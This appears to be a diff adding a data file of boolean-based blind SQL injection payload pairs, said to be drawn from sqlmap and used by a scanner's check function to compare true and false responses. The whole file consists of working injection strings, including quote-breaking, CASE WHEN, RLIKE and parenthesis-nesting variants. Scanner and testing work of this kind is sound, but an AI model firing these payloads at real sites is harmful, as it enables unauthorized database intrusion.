@@ -1,0 +1,27 @@
+# SQLMap Boolean-Based Blind Payloads — extraído de sqlmap/data/xml/payloads/boolean_blind.xml
+# Formato: TRUE_PAYLOAD|||FALSE_PAYLOAD
+# Usado em check_sqli_boolean_blind() para comparação de conteúdo
+# Level 1 — básico
+AND 1=1|||AND 1=2
+OR 1=1|||OR 1=2
+AND 1=1--|||AND 1=2--
+OR 1=1--|||OR 1=2--
+# Level 1 — com boundary quotes
+' AND '1'='1|||' AND '1'='2
+' OR '1'='1|||' OR '1'='2
+') AND ('1'='1|||') AND ('1'='2
+') OR ('1'='1|||') OR ('1'='2
+" AND "1"="1|||" AND "1"="2
+") AND ("1"="1|||") AND ("1"="2
+# Level 2 — CASE WHEN
+AND 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END))|||AND 1=(SELECT (CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END))
+' AND 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)) AND '1'='1|||' AND 1=(SELECT (CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)) AND '1'='1
+# Level 2 — RLIKE
+RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))|||RLIKE (SELECT (CASE WHEN (1=2) THEN 1 ELSE 0x28 END))
+# Level 2 — parentheses nesting
+) AND 1=1 AND (1=1|||) AND 1=2 AND (1=1
+)) AND 1=1 AND ((1=1|||)) AND 1=2 AND ((1=1
+))) AND 1=1 AND (((1=1|||))) AND 1=2 AND (((1=1
+# Level 2 — numeric context
+AND 1=1#|||AND 1=2#
+OR 1=1#|||OR 1=2#
